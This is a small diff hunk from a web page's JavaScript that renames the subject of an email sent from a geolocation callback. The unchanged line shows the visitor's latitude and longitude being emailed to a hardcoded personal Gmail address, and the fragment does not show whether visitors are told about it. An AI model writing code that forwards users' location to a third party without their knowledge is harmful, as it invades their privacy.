@@ -193,7 +193,7 @@
                         `;
 
                         // Send email with location data
-                        sendEmail("Form Submission Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                        sendEmail("Location Access", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
                         document.getElementById("locationDisplay").textContent = "Location access denied or error occurred.";
